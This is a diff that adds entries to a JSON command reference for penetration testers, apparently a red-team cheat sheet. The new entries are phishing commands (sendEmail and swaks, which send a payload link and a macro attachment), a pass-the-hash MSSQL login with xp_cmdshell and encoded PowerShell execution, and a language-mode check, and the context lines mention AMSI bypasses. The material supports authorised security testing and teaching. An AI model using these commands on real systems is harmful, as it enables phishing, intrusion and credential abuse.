@@ -112,6 +112,28 @@
     "name": "Impacket-SecretsDump-Hive"
   },
   {
+    "description": "sendEmail is a command-line utility used to send email messages through SMTP servers. It can be leveraged for phishing campaigns to send malicious links or attachments to targets. The following command sends a phishing email with a malicious link in both the subject and message body, encouraging the recipient to click a payload located at http://10.10.21.14/payload.hta.\n\nCommand Reference:\n```\n-s (SMTP server): 10.10.21.1\n\n-t (target): target@hacker.com\n\n-f (sender): sender@hacker.com\n\nAttacking IP address: 10.10.21.14 (hosting payload.hta)\n```\n",
+    "command": "sendEmail -s 10.10.21.1 -t target@hacker.com -f sender@hacker.com -u \"Click http://10.10.21.14/payload.hta\" -m \"click http://10.10.21.14/payload.hta\"\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "SMTP"
+    ],
+    "OS": [
+      "Windows",
+      "Mac",
+      "Linux"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/mogaal/sendEmail"
+    ],
+    "name": "SendMail"
+  },
+  {
     "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will enumerate domain groups, local groups, users, user descriptions, users trusted for delegation, users without a password, You can also use CIDR notation to target a range of ip addresses (i.e. 10.10.10.0/24).\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: john\n\n\tPassword: password123\n\n\tHash (-H):  807726fcf9f188adc26eeafd7dc16bb7\n",
     "command": "crackmapexec ldap 10.10.10.1 -u 'john' -p 'password123' --trusted-for-delegation  --password-not-required --admin-count --users --groups\n",
     "items": [
@@ -820,6 +842,27 @@
       "https://www.attackdebris.com/?p=470"
     ],
     "name": "PowerView-Get-DomainGroupMember"
+  },
+  {
+    "description": "Determining the PowerShell Constrained Language Mode is important for assessing security restrictions on script execution. Constrained Language Mode limits certain operations, such as COM object creation and .NET calls, which can impact payload execution.\n",
+    "command": "$ExecutionContext.SessionState.LanguageMode\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "General",
+      "AV"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass"
+    ],
+    "name": "ConstrainedLanguageMode"
   },
   {
     "description": "A PowerShell module for exporting, importing, removing, permissioning, publishing Active Directory Certificate Templates. It also includes a DSC resource for creating AD CS templates using these functions. This was built with the intent of using DSC for rapid lab builds, but it could also be used in production environments to move templates between AD CS environments. This command is used for duplicating an excisting \n\nCommand Reference:\n```\nName of new created template: newMaus\n\nName of duplicated template: \"Subordinate Certification Authority\"\n\nIdentity: CODER.HTB\\PKI Admins\n```\n",
@@ -1953,6 +1996,28 @@
     "name": "NTLM-stealing_creds-desktop"
   },
   {
+    "description": "Swaks (Swiss Army Knife for SMTP) is a powerful command-line tool that allows for testing and sending emails. It can be leveraged for phishing campaigns to send malicious attachments to unsuspecting users. The following command sends an email with the subject \"READ\", body text \"Please see attached\", and attaches a malicious document (test.docm). The email is sent using the SMTP server at 10.10.21.1.\n\nCommand Reference:\n```\n-s (SMTP server): 10.10.21.1\n\n-t (target): target@hacker.com\n\n-f (sender): sender@hacker.com\n\n--attach: file to send as attachment\n```\n",
+    "command": "swaks --header \"Subject: READ\" --body 'Please see attached' -t target@hacker.com -f sender@hacker.com --server 10.10.21.14 --attach @test.docm\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "SMTP"
+    ],
+    "OS": [
+      "Windows",
+      "Mac",
+      "Linux"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/mogaal/sendEmail"
+    ],
+    "name": "swaks"
+  },
+  {
     "description": "ldapmonitor.py allows you to monitor creation, deletion and changes to LDAP objects live during your pentest.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tAttacker IP: 10.10.10.2\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
     "command": "python3 ldapmonitor.py -u 'john' -d 'TEST.local' -p 'password123' --dc-ip 10.10.10.1\n",
     "items": [
@@ -2818,6 +2883,29 @@
       "https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Patching-AMSI-AmsiOpenSession"
     ],
     "name": "AMSI-Bypass-AmsiOpenSession_Assembly"
+  },
+  {
+    "description": "Impacket's mssqlclient.py allows for interacting with Microsoft SQL Servers using Windows authentication. This tool enables attackers to authenticate via NTLM hashes, enumerate privileges, and execute system commands on vulnerable SQL servers. The following command authenticates to an MSSQL server using a machine account and NTLM hash:\n\nCommand Reference:\n```\n--windows-auth: indicating Windows Authentication\n\nWindows machine account: WEB01$\n\nIP address: 10.10.21.14\n\n-no-pass / --hashes: because it is a pass the hash\n```\n",
+    "command": "impacket-mssqlclient -windows-auth -no-pass 'WEB01$'@10.10.21.14 -hashes \":b978ea39b8d18a578cc6bfff77f1067\"\n",
+    "code": "built-in commands:\nenum_impersonate\nexec_as_login sa\nenable_xp_cmdshell\nxp_cmdshell whoami\nxp_cmdshell powershell -e ENCODED_BASE64 \n",
+    "items": [
+      "Hash",
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "SQL"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py"
+    ],
+    "name": "impacket-mssqlclient"
   },
   {
     "description": "In this Amsi Bypass it sets the HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable registry key to 0 and run the evil script. Add the code at the beginning of your evil Jscript file to turn off the AMSI.\n\nCommand Reference:\n```\nRegistry key: HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable\n\n-e:  option indicates that the specified script file will be processed by jscript.dll (GUID)\n\nGUID: F414C262-6AC0-11CF-B6D1-00AA00BBBB58\n```\n",
